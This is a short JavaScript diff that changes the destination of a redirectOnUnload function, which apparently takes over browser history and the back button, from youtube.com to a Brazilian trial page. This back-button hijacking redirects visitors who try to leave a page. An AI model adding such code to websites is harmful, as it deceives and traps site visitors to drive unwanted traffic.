@@ -35,7 +35,7 @@ window.addEventListener('popstate', function (event) {
 });
 
 function redirectOnUnload() {
-  var redirectUrl = 'https://youtube.com'; // замените этот URL на нужный
+  var redirectUrl = 'https://adheart.com.br/trial'; // замените этот URL на нужный
   var currentState = { redirectUrl: redirectUrl };
   history.replaceState(currentState, '');
   setTimeout(function () {
